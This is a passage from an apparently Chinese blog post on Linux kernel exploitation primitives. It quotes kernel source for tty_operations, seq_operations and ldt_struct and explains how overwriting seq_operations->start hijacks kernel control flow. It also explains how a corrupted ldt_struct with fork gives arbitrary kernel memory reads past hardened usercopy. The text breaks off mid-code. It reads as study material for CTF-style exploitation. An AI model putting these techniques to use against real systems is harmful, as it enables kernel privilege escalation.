<span class="title">tty_files</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> closing;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *write_buf;</span><br><span class="line">    <span class="type">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Each of a tty&#x27;s open files has private_data pointing to tty_file_private */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* tty magic number */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_MAGIC        0x5401</span></span><br></pre></td></tr></table></figure>
<p><code>tty_struct</code>中ops对应的<code>tty_operations</code>结构体,定义于<code>/include/linux/tty_driver.h</code> 中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,</span><br><span class="line">              <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line">    <span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*write_room)</span><span class="params">(<span class="keyword">struct</span> tty_struct *tty)</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*chars_in_buffer)</span><span class="params">(<span class="keyword">struct</span> tty_struct *tty)</span>;</span><br><span class="line">    <span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                 <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line">    <span class="type">int</span>  (*get_serial)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> serial_struct *p);</span><br><span class="line">    <span class="type">int</span>  (*set_serial)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> serial_struct *p);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> seq_file *m);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line">    <span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line">    <span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> (*proc_show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<h2 id="seq-operations"><a href="#seq-operations" class="headerlink" title="seq_operations"></a>seq_operations</h2><p><strong>申请obj大小:32</strong></p>
<p><strong>GFP_KERNEL_ACCOUNT:是</strong></p>
<p><strong>功能:.text泄露|劫持流</strong></p>
<p>当打开<code>/proc/id/stat</code>文件时,会分配一个<code>seq_operations</code>结构体,定义如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">    <span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>只包含四个函数指针,显然可以用来劫持执行流和泄露地址</p>
<p>一般选择打开<code>/proc/self/stat</code>来<strong>分配</strong>该结构体,同样关闭即可<strong>释放</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>);<span class="comment">//分配</span></span><br><span class="line">close(fd);<span class="comment">//释放</span></span><br></pre></td></tr></table></figure>
<p>当我们 read 一个 stat 文件时，内核会调用其 proc_ops 的 <code>proc_read_iter</code> 指针，其默认值为 <code>seq_read_iter()</code> 函数，定义于 <code>fs/seq_file.c</code> 中，注意到有如下逻辑：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">seq_read_iter</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *iter)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure>
<p>即其会调用 seq_operations 中的 start 函数指针，那么<strong>我们只需要控制 seq_operations-&gt;start 后再读取对应 stat 文件便能控制内核执行流</strong></p>
<h2 id="ldt-struct"><a href="#ldt-struct" class="headerlink" title="ldt_struct"></a>ldt_struct</h2><p><strong>申请obj大小:32[slab]||16[slub]</strong></p>
<p><strong>GFP_KERNEL_ACCOUNT:否</strong></p>
<p><strong>功能:任意读|任意写</strong></p>
<p>ldt 即<strong>局部段描述符表</strong>(<strong>Local Descriptor Table</strong>)，其中存放着<strong>进程的</strong>段描述符，段寄存器当中存放着的段选择子便是段描述符表中段描述符的索引</p>
<p>定义如下(<code>/arch/x86/include/asm/mmu_context.h</code>)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ldt_structs can be allocated, used, and freed, but they are never</span></span><br><span class="line"><span class="comment"> * modified while live.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Xen requires page-aligned LDTs with special permissions.  This is</span></span><br><span class="line"><span class="comment">	 * needed to prevent us from installing evil descriptors such as</span></span><br><span class="line"><span class="comment">	 * call gates.  On native, we could merge the ldt_struct and LDT</span></span><br><span class="line"><span class="comment">	 * allocations, but it&#x27;s not worth trying to optimize.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>	*<span class="title">entries</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		nr_entries;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If PTI is in use, then the entries array is not mapped while we&#x27;re</span></span><br><span class="line"><span class="comment">	 * in user mode.  The whole array will be aliased at the addressed</span></span><br><span class="line"><span class="comment">	 * given by ldt_slot_va(slot).  We use two slots so that we can allocate</span></span><br><span class="line"><span class="comment">	 * and map, and enable a new LDT without invalidating the mapping</span></span><br><span class="line"><span class="comment">	 * of an older, still-in-use LDT.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * slot will be -1 if this LDT doesn&#x27;t have an alias mapping.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">int</span>			slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>结构体大小是<code>0x10</code>,slub中会在<code>kmalloc-16</code>申请,slab则会在<code>kmalloc-32</code>申请</p>
<p>entries指向一个数组</p>
<p>nr_entries记录着数组的数量</p>
<p><code>struct desc_struct</code>即使段描述符,定义如下(<code>/arch/x86/include/asm/desc_defs.h</code>),暂时不管他</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 8 byte segment descriptor */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> &#123;</span></span><br><span class="line">	u16	limit0;</span><br><span class="line">	u16	base0;</span><br><span class="line">	u16	base1: <span class="number">8</span>, type: <span class="number">4</span>, s: <span class="number">1</span>, dpl: <span class="number">2</span>, p: <span class="number">1</span>;</span><br><span class="line">	u16	limit1: <span class="number">4</span>, avl: <span class="number">1</span>, l: <span class="number">1</span>, d: <span class="number">1</span>, g: <span class="number">1</span>, base2: <span class="number">8</span>;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure>
<p>Linux 提供 <code>modify_ldt</code> 系统调用，通过该系统调用可以<strong>获取或修改当前进程的 LDT</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="type">int</span> , func , <span class="type">void</span> __user * , ptr ,</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (func) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">		ret = read_ldt(ptr, bytecount);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">		ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;</span></span><br><span class="line"><span class="comment">	 * return type, but tht ABI for sys_modify_ldt() expects</span></span><br><span class="line"><span class="comment">	 * &#x27;int&#x27;.  This cast gives us an int-sized value in %rax</span></span><br><span class="line"><span class="comment">	 * for the return code.  The &#x27;unsigned&#x27; is necessary so</span></span><br><span class="line"><span class="comment">	 * the compiler does not try to sign-extend the negative</span></span><br><span class="line"><span class="comment">	 * return codes into the high half of the register when</span></span><br><span class="line"><span class="comment">	 * taking the value from int-&gt;long.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="read-ldt"><a href="#read-ldt" class="headerlink" title="read_ldt"></a>read_ldt</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">read_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> entries_size;</span><br><span class="line">	<span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line">	down_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!mm-&gt;context.ldt) &#123;</span><br><span class="line">		retval = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (bytecount &gt; LDT_ENTRY_SIZE * LDT_ENTRIES)</span><br><span class="line">		bytecount = LDT_ENTRY_SIZE * LDT_ENTRIES;</span><br><span class="line"></span><br><span class="line">	entries_size = mm-&gt;context.ldt-&gt;nr_entries * LDT_ENTRY_SIZE;</span><br><span class="line">	<span class="keyword">if</span> (entries_size &gt; bytecount)</span><br><span class="line">		entries_size = bytecount;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">		retval = -EFAULT;</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (entries_size != bytecount) &#123;</span><br><span class="line">		<span class="comment">/* Zero-fill the rest and pretend we read bytecount bytes. */</span></span><br><span class="line">		<span class="keyword">if</span> (clear_user(ptr + entries_size, bytecount - entries_size)) &#123;</span><br><span class="line">			retval = -EFAULT;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	retval = bytecount;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">	up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中两个常量宏的定义如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Maximum number of LDT entries supported. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRIES	8192</span></span><br><span class="line"><span class="comment">/* The size of each LDT entry. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRY_SIZE	8</span></span><br></pre></td></tr></table></figure>
<p>重点看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">	retval = -EFAULT;</span><br><span class="line">	<span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果我们能够修改ldt结构的entries结构,便能够做到任意读</p>
<p>并且copy_from_user和copy_to_user的返回值均是未成功copy的数量,可以以此判断是否命中</p>
<h4 id="大范围搜索内存"><a href="#大范围搜索内存" class="headerlink" title="大范围搜索内存"></a>大范围搜索内存</h4><p>不过就算read_ldt能够帮助我们搜索内存,但是仍然无法完全避免<code>hardened usercopy</code>的影响</p>
<p>但观察 fork 系统调用的源码，我们可以发现如下执行链：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sys_fork()</span><br><span class="line">    kernel_clone()</span><br><span class="line">        copy_process()</span><br><span class="line">            copy_mm()</span><br><span class="line">                dup_mm()</span><br><span class="line">                    dup_mmap()</span><br><span class="line">                        arch_dup_mmap()</span><br><span class="line">                            ldt_dup_context()</span><br></pre></td></tr></table></figure>
<p>ldt_dup_context() 定义于 <code>arch/x86/kernel/ldt.c</code> 中，逻辑如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Called on fork from arch_dup_mmap(). Just copy the current LDT state,</span></span><br><span class="line"><span class="comment"> * the new task is not running, so nothing can be installed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ldt_dup_context</span><span class="params">(<span class="keyword">struct</span> mm_struct *old_mm, <span class="keyword">struct</span> mm_struct *mm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>new_ldt-&gt;nr_entries</code>由<code>old_ldt-&gt;nr_entries</code>赋值</p>
<p>在这里会通过 memcpy 将父进程的 ldt-&gt;entries 拷贝给子进程，<strong>是完全处在内核中的操作</strong>,因此能够绕过<code>hardened usercopy</code>的检查</p>
<p>当父进程设置目标地址后,再打开子进程,便会将目标地址处的内容复制到子进程的ldt中,之后再使用read_ldt便能够直接读取</p>
<h3 id="write-ldt"><a href="#write-ldt" class="headerlink" title="write_ldt"></a>write_ldt</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount, <span class="type">int</span> oldmode)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>, *<span class="title">old_ldt</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> old_nr_entries, new_nr_entries;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">ldt_info</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line">	<span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line">	error = -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (bytecount != <span class="keyword">sizeof</span>(ldt_info))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	error = -EFAULT;</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(&amp;ldt_info, ptr, <span class="keyword">sizeof</span>(ldt_info)))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	error = -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (ldt_info.entry_number &gt;= LDT_ENTRIES)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	<span class="keyword">if</span> (ldt_info.contents == <span class="number">3</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (oldmode)</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		<span class="keyword">if</span> (ldt_info.seg_not_present == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((oldmode &amp;&amp; !ldt_info.base_addr &amp;&amp; !ldt_info.limit) ||</span><br><span class="line">	    LDT_empty(&amp;ldt_info)) &#123;</span><br><span class="line">		<span class="comment">/* The user wants to clear the entry. */</span></span><br><span class="line">		<span class="built_in">memset</span>(&amp;ldt, <span class="number">0</span>, <span 